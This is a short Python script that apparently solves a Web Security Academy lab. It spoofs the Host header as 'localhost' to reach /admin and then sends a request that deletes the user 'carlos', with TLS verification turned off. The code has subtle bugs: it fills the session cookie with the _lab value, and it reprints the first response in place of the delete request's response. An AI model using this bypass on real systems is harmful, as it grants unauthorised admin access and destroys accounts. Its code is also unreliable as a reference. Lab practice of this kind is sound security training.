import re

import http.client
import ssl

LAB_ID = "???"


def GET(
        path: str,
        _lab: str | None = None,
        session: str | None = None,
        _host: str | None = None,
) -> http.client.HTTPResponse:
    method = 'GET'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {}
    cookies = []
    if _lab:
        cookies.append(f'_lab={_lab}')
    if session:
        cookies.append(f'session={_lab}')
    if cookies:
        headers['cookie'] = "; ".join(cookies)
    if _host:
        headers['host'] = _host
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def lab_cookies() -> tuple[str, str]:
    response = GET(path="/")
    cookie_header = response.getheader('set-cookie')
    _lab = re.findall(r'_lab=([%a-zA-Z0-9]+);', cookie_header)[0]
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    return _lab, session


_lab, session = lab_cookies()
print(f"_lab: {_lab}")
print(f"session: {session}")
response = GET(path="/admin", _host='localhost', _lab=_lab, session=session)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
if response.status in (400, 401):
    print("host header authentication not confirmed")
    exit(1)
print("host header authentication confirmed")

GET(path="/admin/delete?username=carlos", _host="localhost", _lab=_lab, session=session)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
